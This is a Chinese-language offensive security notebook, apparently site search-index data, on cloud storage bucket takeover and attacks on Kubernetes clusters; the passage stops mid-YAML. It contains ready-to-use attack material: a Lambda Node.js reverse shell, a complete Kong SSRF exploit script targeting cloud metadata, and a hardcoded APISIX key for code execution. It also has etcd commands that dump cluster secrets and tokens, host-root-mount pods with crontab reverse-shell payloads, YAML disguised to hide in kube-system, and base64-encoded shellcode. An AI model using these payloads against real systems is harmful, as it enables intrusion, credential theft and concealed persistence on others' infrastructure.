\u4ee3\u8868\u4e0d\u5b58\u5728 AccessDenied \u6216\u8005\u5217\u51fa\u4fe1\u606f\u4ee3\u8868\u5b58\u5728 \u5229\u7528 \u904d\u5386\u6587\u4ef6\u3001PUT\u4e0a\u4f20\u6587\u4ef6 \u5728\u6876\u5f03\u7528\u7684\u60c5\u51b5\u4e0b\u5c06\u6876\u52a0\u5230\u81ea\u5df1\u7684\u8d26\u53f7\u91cc\u9762\u8fdb\u884c\u63a5\u7ba1\uff0c\u5982\u679c\u6b64\u65f6\u8fd9\u4e2a\u6876\u8fd8\u7ed1\u5b9a\u4e86cname\u8bb0\u5f55\uff0c\u90a3\u4e48\u76f8\u5f53\u4e8e\u63a5\u7ba1\u76ee\u6807\u7684\u57df\u540d\u3002 \u4fee\u6539\u6876\u91cc\u7684\u8d44\u6e90\u6587\u4ef6\u4ee5\u4fbf\u9493\u9c7c \u8bfb\u53d6\u914d\u7f6e\u4ee5\u4fbf\u8fdb\u884c\u8bbf\u95ee\u654f\u611f\u6587\u4ef6 \u4fee\u6539\u6876\u7684ACL \u4fee\u6539\u5bf9\u8c61\u7684ACL \u53c2\u8003\uff1ahttps://mp.weixin.qq.com/s/aqTnyNgTSBan_FpqfFRb7Q \u963f\u91cc\u4e91OSS \u548cAWS S3\u4e00\u6837 \u683c\u5f0f\u662f xxxx.oss-cn-beijing.aliyuncs.com \u6839\u636eOSS\u5730\u533a\u4e0d\u540c\uff0c\u53ef\u80fd\u9700\u8981\u53d8\u66f4\u57ce\u5e02\u540d\u79f0 \u5229\u7528\u70b9\u548cAWS\u5dee\u4e0d\u591a\uff0c\u547d\u4ee4\u8bed\u6cd5\u7565\u6709\u533a\u522b \u5b98\u65b9\u6587\u6863 \u63a7\u5236\u53f0\u64cd\u4f5c\u6307\u5357 - \u5bf9\u8c61\u5b58\u50a8 OSS - \u963f\u91cc\u4e91 \u83b7\u53d6OSS\u914d\u7f6e ossutil bucket-policy oss://xxxxx --method get \u4fee\u6539\u914d\u7f6e ossutil bucket-policy oss://xxxxx --method put xx.json \u534e\u4e3a\u4e91OBS \u90fd\u5dee\u4e0d\u591a\u7684\uff0c\u683c\u5f0f\u662f xxxx.obs.cn-south-1.myhuaweicloud.com \u3002\u53ef\u4ee5\u76f4\u63a5\u53bb\u81ea\u5df1\u7684\u63a7\u5236\u53f0\u6dfb\u52a0\u6876\uff0c\u52a0\u4e0d\u5230\u8bf4\u660e\u5df2\u5b58\u5728\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fdb\u4e00\u6b65\u5229\u7528\u3002 \u9047\u5230\u65f6\u518d\u8bfb\u5b98\u65b9\u6587\u6863 \u521d\u59cb\u5316\u914d\u7f6e_\u5bf9\u8c61\u5b58\u50a8\u670d\u52a1 OBS_obsutil_\u5feb\u901f\u5165\u95e8_\u534e\u4e3a\u4e91 \u817e\u8baf\u4e91COS \u817e\u8baf\u4e91\u76f8\u8f83\u5b89\u5168\u4e00\u70b9\uff0c\u56e0\u4e3a\u817e\u8baf\u4e91\u7684\u6876\u5728\u751f\u6210\u65f6\u4f1a\u5728\u8bbf\u95ee\u5730\u5740\u4e2d\u751f\u6210\u4e00\u4e2a\u65f6\u95f4\u6233\uff0c\u53ef\u4ee5\u907f\u514d\u6876\u7206\u7834\u548c\u521b\u5efa\u76f8\u540c\u6876\u540d\u63a5\u7ba1\u57df\u540d\u7684\u95ee\u9898\u3002 \u9047\u5230\u65f6\u518d\u8bfb\u5b98\u65b9\u6587\u6863 \u5bf9\u8c61\u5b58\u50a8 COSCLI \u7b80\u4ecb - \u5de5\u5177\u6307\u5357 - \u6587\u6863\u4e2d\u5fc3 - \u817e\u8baf\u4e91 \u5fae\u8f6f\u4e91Blob \u683c\u5f0f\u662f\u4ee5\u8d26\u53f7\u547d\u4ee4\uff0c xxxx.blob.core.windows.net \u4f7f\u7528 https://xxxx.blob.core.windows.net/xxxx?restype=container&comp=list \u5217\u51fa\u5bf9\u8c61 Blob\uff08\u5bf9\u8c61\uff09\u5b58\u50a8\u7b80\u4ecb - Azure Storage | Microsoft Docs \u8c37\u6b4c\u4e91GCS \u683c\u5f0f\u662f\u4ee5\u8d26\u53f7\u4e3a\u8def\u5f84 https://storage.googleapis.com/xxxx https://cloud.google.com/storage/#section-4 \u5176\u4ed6\u4e91\u5e73\u53f0 \u601d\u8def\u90fd\u4e00\u6837\uff0c\u9047\u5230\u4e86\u518d\u53bb\u7ffb\u6587\u6863\u5c31\u662f\u4e86\u3002 AWS Lambda\u53cd\u5f39shell (function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(8080, \"\u6b64\u5904\u66ff\u6362\u4e3a\u653b\u51fb\u7aefIP\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })(); \u654f\u611f\u7684\u7aef\u53e3 kube-apiserver: 6443, 8080 kubectl proxy: 8080, 8081 kubelet: 10250, 10255, 4149 dashboard: 30000 docker api: 2375 etcd: 2379, 2380 kube-controller-manager: 10252 kube-proxy: 10256, 31442 kube-scheduler: 10251 weave: 6781, 6782, 6783 kubeflow-dashboard: 8080 Kong API\u7f51\u5173\u5f00\u6e90\u7248 \u6307\u7eb9 \u670d\u52a1\u7aef\u8fd4\u56de Server: kong/x.x.x CVE-2020-11710 \u5229\u7528\u7248\u672c\u5c0f\u4e8e2.0.3\uff0c\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165Kong API\u7f51\u5173\u5185\u7f51 usage: kong-pwn.py [-h] -u URL -s SSRF [-p PROXY] kong-pwn.py: error: the following arguments are required: -u/--url, -s/--ssrf $ python3 kong-pwn.py -u http://127.0.0.1:8001 [+] Service Added [+] [+] Route Added [+] [+] Testing Kong for Metadata Proxy curl http://127.0.0.1/foo/ -H \"Host: metadata.local\" -H \"Metadata: true\" -H \"Metadata-Flavor: Google\" 1.0 2007-01-19 2007-03-01 2007-08-29 2007-10-10 2007-12-15 2008-02-01 2008-09-01 2009-04-04 2011-01-01 2011-05-01 2012-01-12 2014-02-25 2014-11-05 2015-10-20 2016-04-19 2016-06-30 2016-09-02 2018-03-28 2018-08-17 2018-09-24 2019-10-01 latest [+] To remove added routes and services do the following curl -iX DELETE http://127.0.0.1:8001/routes/metadata-endpoint curl -iX DELETE http://127.0.0.1:8001/services/metadata-endpoint #!/usr/bin/env python # # Kong SSRF # # # By @RandomRobbieBF # # import requests import json import sys import argparse import re import os.path import json from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) session = requests.Session() parser = argparse.ArgumentParser() parser.add_argument(\"-u\", \"--url\", required=True,help=\"Kong APi url can be http or https\") parser.add_argument(\"-s\", \"--ssrf\", default=\"http://169.254.169.254\", required=False,help=\"What Internal URL to proxy http:// or https://\") parser.add_argument(\"-p\", \"--proxy\",required=False, help=\"Proxy for debugging\") args = parser.parse_args() url = args.url proxy = args.proxy ssrfurl = args.ssrf if proxy: proxy = args.proxy else: proxy = \"\" http_proxy = proxy proxyDict = { \"http\" : http_proxy, \"https\" : http_proxy, \"ftp\" : http_proxy } def add_service(url): paramsPost = {\"name\":\"metadata-endpoint\",\"url\":\"\"+ssrfurl+\"\"} headers = {\"User-Agent\":\"curl/7.64.1\",\"Connection\":\"close\",\"Accept\":\"*/*\",\"Content-Type\":\"application/x-www-form-urlencoded\"} response = session.post(\"\"+url+\"/services\", data=paramsPost, headers=headers,verify=False, proxies=proxyDict) if response.status_code == 201: print (\"[+] Service Added [+]\") y = json.loads(response.text) try: id = y[\"id\"] return id except: print (\"[-] Error Parsing ID of new service [-]\") sys.exit(0) else: print(\"Error:\\n\\n\"+response.text+\"\") sys.exit(0) def add_route(url,id): paramsPostDict = {\"hosts[]\":\"metadata.local\",\"paths[]\":\"/foo\",\"service.id\":\"\"+id+\"\",\"name\":\"metadata-endpoint\"} paramsPost = \"&\".join(\"%s=%s\" % (k,v) for k,v in paramsPostDict.items()) headers = {\"User-Agent\":\"curl/7.64.1\",\"Connection\":\"close\",\"Accept\":\"*/*\",\"Content-Type\":\"application/x-www-form-urlencoded\"} response = session.post(\"\"+url+\"/routes/\", data=paramsPost, headers=headers,verify=False, proxies=proxyDict) if response.status_code == 201: print (\"[+] Route Added [+]\") y = json.loads(response.text) rid = y[\"id\"] t = url.replace(\":8001\",\"\") print(\"\\n[+] Testing Kong for Metadata Proxy\") cmd = ('curl '+t+'/foo/ -H \"Host: metadata.local\" -H \"Metadata: true\" -H \"Metadata-Flavor: Google\"') print(cmd) os.system(cmd) print (\"\\n\\n[+] To remove added routes and services do the following\") print(\"curl -iX DELETE \"+url+\"/routes/metadata-endpoint\") print(\"curl -iX DELETE \"+url+\"/services/metadata-endpoint\") else: print(\"Error:\\n\\n\"+response.text+\"\") sys.exit(0) id = add_service(url) add_route(url,id) Apache APISIX \u9ed8\u8ba4\u7aef\u53e39000\uff0c\u6307\u7eb9\u76f4\u63a5/apisix APIKEY\u786c\u7f16\u7801RCE \u6dfb\u52a0\u4e00\u4e2ahttp\u5934\uff1aX-API-KEY: edd1c9f034335f136f87ad84b625c8f1 \u5176\u4ed6\u6f0f\u6d1e \u7f51\u4e0a\u641c \u5c1d\u8bd5\u5217\u51fa\u5bf9\u8c61 aws s3 ls s3://xxxx/duixiang \u5c1d\u8bd5\u8bfb\u53d6\u5bf9\u8c61ACL aws s3api get-object-acl --bucket xxxx--key duixiang \u5c1d\u8bd5\u4fee\u6539\u5bf9\u8c61ACL \u6839\u636e\u67e5\u770b\u7684\u7ed3\u679c\uff0c\u4fee\u6539\u4e0b\u9762\u7684\u5c5e\u6027\u7136\u540e\u4fdd\u5b58\u4e3ajson \"Permission\": \"FULL_CONTROL\" aws s3api put-object-acl --bucket xxxx--key duixiang--access-control-policy file://acl.json \u5c1d\u8bd5\u5217\u51fa\u6876 aws s3api list-objects --bucket xxxx \u67e5\u770b\u6876\u7684ACL aws s3api get-bucket-acl --bucket xxxx \u5c1d\u8bd5\u4fee\u6539\u6876ACL aws s3api put-bucket-acl --bucket xxxx --access-control-policy file://acl.json \u6839\u636e\u67e5\u770b\u7684\u7ed3\u679c\uff0c\u4fee\u6539\u4e0b\u9762\u7684\u5c5e\u6027\u7136\u540e\u4fdd\u5b58\u4e3ajson \"Permission\": \"FULL_CONTROL\" aws s3api get-bucket-policy --bucket xxxx --output text | python3 -m json.tool","title":"K8s\u653b\u51fb\u9762"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#k8s","text":"","title":"k8s&amp;\u4e91\u539f\u751f\u7b14\u8bb0"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#title-k8s-date-2021-10-28-100526-update-2022422","text":"","title":"title: k8s&amp;\u4e91\u5b89\u5168\u7b14\u8bb0 date: 2021-10-28 10:05:26 update: 2022\u5e744\u670822\u65e5"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_1","text":"\u5b98\u65b9\u63d0\u4f9b\u4e86\u6a21\u62df\u73af\u5883\uff0c\u4f46\u662f\u6a21\u62df\u73af\u5883\u5e76\u4e0d\u662f\u5f88\u65b9\u4fbf\u3002","title":"\u5b89\u88c5&amp;&amp;\u542f\u52a8"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#minikube","text":"minikube\u7528\u4e8e\u542f\u52a8cluster \u5148\u5b89\u88c5docker\uff0c18.09\u7248\u672c\u4ee5\u4e0a apt install docker.io \u5b89\u88c5minikube curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 sudo install minikube-linux-amd64 /usr/local/bin/minikube \u542f\u52a8minikube\uff0c\u542f\u52a8\u96c6\u7fa4 \u7b2c\u4e00\u6b21\u542f\u52a8k8s\u9700\u8981\u5b89\u88c5\uff0c\u6307\u5b9a\u963f\u91cc\u4e91\u955c\u50cf minikube start --force \\ --driver docker \\ --registry-mirror https://\\*\\*\\*\\*\\*\\*\\*\\*.mirror.aliyuncs.com \\ --image-repository=registry.cn-hangzhou.aliyuncs.com/google_containers \u5982\u5b89\u88c5\u5361\u4f4f\uff0c\u5148\u4f7f\u7528 minikube delete \u5220\u9664\u65e7\u6570\u636e \u5982\u63d0\u793adocker\u8fd0\u884c\u6743\u9650\u4e0d\u591f\uff0c\u53ef\u4f7f\u7528\u5f3a\u5236\u542f\u52a8 minikube start --force --driver=docker \u542f\u52a8nimikube\u540e\uff0c\u4fbf\u4f1a\u81ea\u52a8\u4e3a\u7cfb\u7edf\u521b\u5efa\u4e00\u4e2acluster \u66f4\u591a\u5b89\u88c5\u8be6\u60c5\u89c1https://minikube.sigs.k8s.io/docs/start/","title":"\u5b89\u88c5minikube"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#kubectl","text":"kubectl\u7528\u4e8e\u547d\u4ee4\u884c\u7ba1\u7406\u96c6\u7fa4 \u5b89\u88c5\u8be6\u60c5\u89c1https://kubernetes.io/zh/docs/tasks/tools/install-kubectl-linux/","title":"\u5b89\u88c5kubectl"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_2","text":"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u90e8\u7f72\u955c\u50cf\u662f\u4ecenodes\u91cc\u9762\u62c9\u7684\uff0c\u9700\u8981\u5c06nodes\u673a\u5668\u7684hosts\u89e3\u6790\u6539\u4e00\u4e0b\uff0c\u4e0d\u7136\u65e0\u6cd5\u62c9\u955c\u50cf kubectl create deployment podname --image=xx/xx","title":"\u90e8\u7f72\u5e94\u7528"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#kubectl_1","text":"","title":"kubectl\u7ba1\u7406"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_3","text":"\u67e5\u770b\u96c6\u7fa4\u4fe1\u606f kubectl cluster-info kubectl get nodes kubectl version \u53ef\u4ee5\u4f7f\u7528kubectl proxy\u547d\u4ee4\u5c06API\u4ee3\u7406\u5230\u672c\u5730 \u9ed8\u8ba4\u672c\u5730\u8bbf\u95ee kubectl proxy \u5f00\u542f\u5176\u4ed6\u673a\u5668\u8bbf\u95ee\uff08\u9700\u8981\u6388\u6743\uff09 kubectl proxy --address=0.0.0.0 --port=8009 \u5f00\u542f\u5176\u4ed6\u673a\u5668\u8bbf\u95ee\uff08\u672a\u6388\u6743\u8bbf\u95ee\uff09 kubectl proxy --address='0.0.0.0' --accept-hosts='^*$' --port=8009","title":"\u96c6\u7fa4\u7ba1\u7406"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#pods","text":"// \u83b7\u5f97\u6240\u6709\u8282\u70b9 > kubectl -s http://1.2.3.4:8080/ get nodes // \u83b7\u5f97\u6240\u6709\u5bb9\u5668 > kubectl -s http://1.2.3.4:8080/ get pods --all-namespaces=true // \u5728 myapp \u5bb9\u5668\u83b7\u5f97\u4e00\u4e2a\u4ea4\u4e92\u5f0f shell > kubectl -s http://1.2.3.4:8080/ --namespace=default exec -it myapp bash \u67e5\u770bpods kubectl get pods kubectl get pods -n kube-system \u5728pods\u4e0a\u6267\u884c\u547d\u4ee4 \u8fd9\u662f\u76f4\u63a5\u6267\u884c kubectl exec -ti podname whoami kubectl exec -ti podname whoami -n kube-system \u8fd9\u662f\u8fdb\u5165bash kubectl exec podname bash","title":"PODS\u7ba1\u7406"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#services","text":"\u521b\u5efaservice\uff08nodeport\u5f62\u5f0f\uff09 kubectl create service nodeport nginx --tcp 80 \u521b\u5efaservice\uff08LoadBalancer\u5f62\u5f0f\uff09 kubectl expose deployment hello-node --type=LoadBalancer --port=8080 nodeport\u548cLoadBalancer\u533a\u522b\u662f\u8d1f\u8f7d \u67e5\u770bservice kubectl get service \u67e5\u770bservice\u8be6\u60c5 kubectl describe services/nginx \u8fd9\u6837\u5c31\u662f\u5c06service\u6620\u5c04\u5230\u4e86master\u4e0a\u3002","title":"services\u7ba1\u7406"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_4","text":"http://127.0.0.1:46739/api/v1/namespaces/kubernetes-dashboard/services/http:kubernetes-dashboard:/proxy/#/workloads?namespace=default","title":"\u56fe\u5f62\u5316\u754c\u9762"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_5","text":"kubectl config view","title":"\u67e5\u770b\u914d\u7f6e"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#ip","text":"docker inspect -f='{{.Name}} {{.NetworkSettings.IPAddress}} {{.HostConfig.PortBindings}}' $(docker ps -aq)","title":"\u67e5\u770b\u6240\u6709\u5bb9\u5668ip"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_6","text":"","title":"\u5229\u7528\u70b9"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#api","text":"\u53ef\u4ee5\u76f4\u63a5\u7528kubectl\u64cd\u4f5c \u67e5\u770bpods /api/v1/namespaces/default/pods?limit=500 \u521b\u5efa\u5bb9\u5668\uff0c\u8ddf\u4e00\u822c\u7684\u4e00\u6837 /api/v1/namespaces/default/pods {\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{\"kubectl.kubernetes.io/last-applied-configuration\":\"{\\\"apiVersion\\\":\\\"v1\\\",\\\"kind\\\":\\\"Pod\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"name\\\":\\\"test-4444\\\",\\\"namespace\\\":\\\"default\\\"},\\\"spec\\\":{\\\"containers\\\":[{\\\"image\\\":\\\"nginx:1.14.2\\\",\\\"name\\\":\\\"test-4444\\\",\\\"volumeMounts\\\":[{\\\"mountPath\\\":\\\"/host\\\",\\\"name\\\":\\\"host\\\"}]}],\\\"volumes\\\":[{\\\"hostPath\\\":{\\\"path\\\":\\\"/\\\",\\\"type\\\":\\\"Directory\\\"},\\\"name\\\":\\\"host\\\"}]}}\\n\"},\"name\":\"test-4444\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"name\":\"test-4444\",\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host\"}]}} \u6267\u884c\u547d\u4ee4\uff0c\u9047\u5230400\u65f6\u4f7f\u7528wscat wscat -n -c '/api/v1/namespaces/default/pods/test-4444/exec?stdout=1&stderr=1&tty=true&command=whoami'","title":"\u4e00\u4e9bAPI\u64cd\u4f5c"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#2379etcd","text":"etcd\u662f\u4e00\u4e2a\u9ad8\u53ef\u7528\u7684\u5206\u5e03\u5f0f\u952e\u503c(key-value)\u6570\u636e\u5e93,\u5b58\u50a8\u4e86\u96c6\u7fa4\u72b6\u6001\u3001\u670d\u52a1\u4ee4\u724c\u7b49\u673a\u7b49\u5bc6\u670d\u52a1\u914d\u7f6e\u7b49\u4fe1\u606f\u3002 \u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8bbf\u95ee\u7aef\u53e3\u53ef\u4ee5\u83b7\u53d6\u5230\u952e\u503c\uff0c\u5176\u4e2d\u53ef\u80fd\u5305\u542b\u654f\u611f\u4fe1\u606f\u3002 \u770b\u5230\u7aef\u53e3\u53ef\u4ee5\u7528etcdctl\u53bb\u8fde\u4e00\u4e0b\uff0c\u5982\u679c\u662f\u672a\u6388\u6743\u8bbf\u95ee\u90a3\u4e48\u5c31\u53ef\u4ee5\u6253\u4e0b\u96c6\u7fa4\u4e86\u3002 \u5217\u51fa\u8282\u70b9\u4fe1\u606f /v2/keys \u5217\u51fa\u96c6\u7fa4\u4e2d\u6210\u5458\u4fe1\u606f /v2/members \u5217\u51fa\u6240\u6709\u503c /v2/keys/?recursive=true v3\u7248\u672c\u7684Etcd\u9700\u8981\u7528etcdctl\u6765\u64cd\u4f5c \u4e0b\u8f7dhttps://github.com/etcd-io/etcd/releases \u8bbe\u7f6ev3\u7248\u672capi\uff0ck8s\u7528\u7684v3 export ETCDCTL_API=3 \u672c\u5730 \u672c\u5730\u65e0\u9700\u8ba4\u8bc1 \u67e5\u770b\u8fde\u63a5\u72b6\u6001\uff0c\u8fdc\u7a0b\u52a0 --endpoint\u53c2\u6570 etcdctl endpoint health \u8bfb\u53d6k8s secret etcdctl get / --prefix --keys-only | grep /secrets/ \u8bfb\u53d6AK etcdctl get /registry/secrets/default/acr-credential-518dfd1883737c2a6bde99ed6fee583c \u8fdc\u7a0b\u7684\u60c5\u51b5 \u8bbe\u7f6e\u8bc1\u4e66\uff0c\u7b49\u4e8e\u8ba4\u8bc1\uff0c\u67d0\u4e9b\u60c5\u51b5\u4e0b\u53ef\u4ee5\u642d\u914d\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u4f7f\u7528 export ETCDCTL_CERT=/var/lib/docker/volumes/minikube/_data/lib/minikube/certs/etcd/peer.crt export ETCDCTL_CACERT=/var/lib/docker/volumes/minikube/_data/lib/minikube/certs/etcd/ca.crt export ETCDCTL_KEY=/var/lib/docker/volumes/minikube/_data/lib/minikube/certs/etcd/peer.key etcdctl --insecure-skip-tls-verify --insecure-transport=true --endpoints=https://172.16.0.112:2379 --cacert=ca.pem --key=etcd-client-key.pem --cert=etcd-client.pem endpoint health \u8bfb\u53d6token ./etcdctl --endpoints=https://192.168.253.162:2379 get / --prefix --keys-only | grep /secrets/kube-system/clusterrole ./etcdctl --endpoints=https://192.168.253.162:2379 get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-krf7l","title":"2379\u7aef\u53e3Etcd\u670d\u52a1\u5229\u7528"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_7","text":"\u65b0\u5efa\u4e00\u4e2ayaml apiVersion: v1 kind: Pod metadata: name: myapp spec: containers: - image: k8s.gcr.io/kube-proxy:v1.22.3 name: test-container volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / // \u7531 myapp.yaml \u521b\u5efa\u5bb9\u5668 > kubectl -s http://1.2.3.4:8080/ create -f myapp.yaml // \u7b49\u5f85\u5bb9\u5668\u521b\u5efa\u5b8c\u6210 // \u83b7\u5f97 myapp \u7684\u4ea4\u4e92\u5f0f shell > kubectl -s http://1.2.3.4:8080/ --namespace=default exec -it myapp bash // \u5411 crontab \u5199\u5165\u53cd\u5f39 shell \u7684\u5b9a\u65f6\u4efb\u52a1 > echo -e \"* * * * * root bash -i >& /dev/tcp/127.0.0.1/8888 0>&1\\n\" >> /mnt/etc/crontab // \u4e5f\u53ef\u4ee5\u7528 python \u53cd\u5f39 shell > echo -e \"* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"127.0.0.1\\\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\\n\" >> /mnt/etc/crontab","title":"\u521b\u5efa\u65b0\u5bb9\u5668\u6302\u8f7d\u5bbf\u4e3b\u673a\u76ee\u5f55"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#yaml","text":"\u4ee5\u4e00\u4e2a\u57fa\u7840\u7684\u4e3a\u4f8b \u67e5\u770bproxy\u7684image \u200b kubectl -n kube-system get daemonsets kube-proxy -o yaml | grep \" image:\" | awk '{print $2}' \u67e5\u770b\u6240\u6709\u7684image get pods --all-namespaces -o jsonpath=\"{..image}\" |\\ tr -s '[[:space:]]' '\\n' |\\ sort |\\ uniq -c apiVersion: v1 kind: Pod metadata: name: kube-proxy-s7dhs1 #\u4fee\u6539\u4e3a\u66f4\u590d\u6742\u7684\u540d\u5b57\u66f4\u52a0\u9690\u853d namespace: kube-system #\u8bbe\u7f6e\u4e3asystem\u7684pod\u66f4\u52a0\u9690\u853d spec: tolerations: - key: ab operator: Exists effect: NoSchedule containers: - image: k8s.gcr.io/kube-proxy:v1.22.3 #\u4f7f\u7528\u9ed8\u8ba4image\u4e0d\u4f9d\u8d56\u5916\u90e8image imagePullPolicy: IfNotPresent name: test-container command: [\"/bin/sleep\", \"3650d\"] #\u521b\u5efa\u65f6\u6267\u884c\u547d\u4ee4\uff0c\u53ef\u4ee5\u6267\u884c\u4efb\u4f55\u547d\u4ee4 # command: [\"echo $payload\"] #\u8c03\u7528\u73af\u5883\u53d8\u91cf volumeMounts: - mountPath: /mnt name: test-volume # env: #\u8c03\u7528Secret\u4f5c\u4e3apod\u73af\u5883\u53d8\u91cf # - name: payload #\u73af\u5883\u53d8\u91cf\u540d\u79f0 # valueFrom: # secretKeyRef: # name: secname #secret\u7684name # key: data #secret\u7684dataname volumes: - name: test-volume hostPath: path: /","title":"\u521b\u5efa\u4e00\u4e2a\u66f4\u9690\u853d\u529f\u80fd\u66f4\u5f3a\u7684yaml"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_8","text":"kubectl\u652f\u6301\u7ba1\u9053\u7ed3\u5408\u4f7f\u7528\uff0c\u5728\u65e0\u6587\u4ef6\u7684\u60c5\u51b5\u4e0b\u90e8\u7f72pod\uff0cxx\u586b\u5165yaml\u5185\u5bb9 cat << EOF | kubectl apply -f - xxxxx EOF","title":"\u65e0\u6587\u4ef6\u90e8\u7f72"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#_9","text":"\u5148\u5efa\u4e00\u4e2aSecret\uff0c\u53ef\u4ee5\u652f\u6301\u591a\u6570\u636e\u3002Secret\u5f15\u7528\u65f6\u4f1a\u81ea\u52a8base64\u89e3\u7801\uff0c\u6240\u4ee5\u4f20\u5165base64\u7684\u7f16\u7801\u6570\u636e #Secret.yaml apiVersion: v1 kind: Secret metadata: name: secname namespace: kube-system #\u8bbe\u7f6e\u4e3akube-system\u589e\u5f3a\u9690\u853d\u6027 type: Opaque #\u7c7b\u578b\u4e3a\u8fd9\u4e2a data: data: XHg3Rlx4NDVceDRDXHg0Nlx4MDFceDAxXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDJceDAwXHgwM1x4MDBceDAxXHgwMFx4MDBceDAwXHg1NFx4ODBceDA0XHgwOFx4MzRceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MzRceDAwXHgyMFx4MDBceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4ODBceDA0XHgwOFx4MDBceDgwXHgwNFx4MDhceENGXHgwMFx4MDBceDAwXHg0QVx4MDFceDAwXHgwMFx4MDdceDAwXHgwMFx4MDBceDAwXHgxMFx4MDBceDAwXHg2QVx4MEFceDVFXHgzMVx4REJceEY3XHhFM1x4NTNceDQzXHg1M1x4NkFceDAyXHhCMFx4NjZceDg5XHhFMVx4Q0RceDgwXHg5N1x4NUJceDY4XHhDMFx4QThceDEzXHhGM1x4NjhceDAyXHgwMFx4MTFceDVDXHg4OVx4RTFceDZBXHg2Nlx4NThceDUwXHg1MVx4NTdceDg5XHhFMVx4NDNceENEXHg4MFx4ODVceEMwXHg3OVx4MTlceDRFXHg3NFx4M0RceDY4XHhBMlx4MDBceDAwXHgwMFx4NThceDZBXHgwMFx4NkFceDA1XHg4OVx4RTNceDMxXHhDOVx4Q0RceDgwXHg4NVx4QzBceDc5XHhCRFx4RUJceDI3XHhCMlx4MDdceEI5XHgwMFx4MTBceDAwXHgwMFx4ODlceEUzXHhDMVx4RUJceDBDXHhDMVx4RTNceDBDXHhCMFx4N0RceENEXHg4MFx4ODVceEMwXHg3OFx4MTBceDVCXHg4OVx4RTFceDk5XHhCMlx4NkFceEIwXHgwM1x4Q0RceDgwXHg4NVx4QzBceDc4XHgwMlx4RkZceEUxXHhCOFx4MDFceDAwXHgwMFx4MDBceEJCXHgwMVx4MDBceDAwXHgwMFx4Q0RceDgw \u901a\u8fc7\u73af\u5883\u53d8\u91cf\u8c03\u7528","title":"\u4f20\u5165\u8f83\u591a\u6570\u636e\u65f6"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/#replicasetdaemonsetdeplyment","text":"\u5728\u5b9e\u6218\u4e2d\u8981\u8003\u8651\u5230k8s\u7684\u53ef\u7528\u6027\uff0c\u6240\u4ee5\u6700\u597d\u4e0d\u8981\u5bf9\u5173\u952e\u5bb9\u5668\u505a\u64cd\u4f5c\u3002 a.yaml apiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment labels: app: nginx-test spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - image: nginx name: container volumeMounts: - mountPath: /mnt name: 